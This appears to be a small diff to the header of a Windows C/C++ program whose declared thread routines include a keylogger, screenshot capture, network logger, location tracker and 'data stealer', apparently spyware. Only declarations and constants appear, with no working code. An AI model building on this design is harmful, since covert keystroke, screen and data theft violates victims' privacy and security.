@@ -30,9 +30,10 @@ struct CompareDates {
 
 #pragma warning(disable:4996) // Disable "unsafe" warnings
 #define SYNC_TIME 60000 // 1 minute
+#define LONG_SYNC_TIME 3600000 // 1 hour
 #define NETLOG_SIZE 5
 
-DWORD WINAPI initFiltering(LPVOID lpParam);
+DWORD WINAPI initConfig(LPVOID lpParam);
 DWORD WINAPI initNetLogger(LPVOID lpParam);
 DWORD WINAPI initKeylogger(LPVOID lpParam);
 DWORD WINAPI initScreenshot(LPVOID lpParam);
@@ -44,5 +45,6 @@ DWORD WINAPI initLocationTracker(LPVOID lpParam);
 DWORD WINAPI initDataStealer(LPVOID lpParam);
 DWORD WINAPI initDataManager(LPVOID lpParam);
 DWORD WINAPI initRequestManager(LPVOID lpParam);
+DWORD WINAPI checkActive();
 
 BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle);
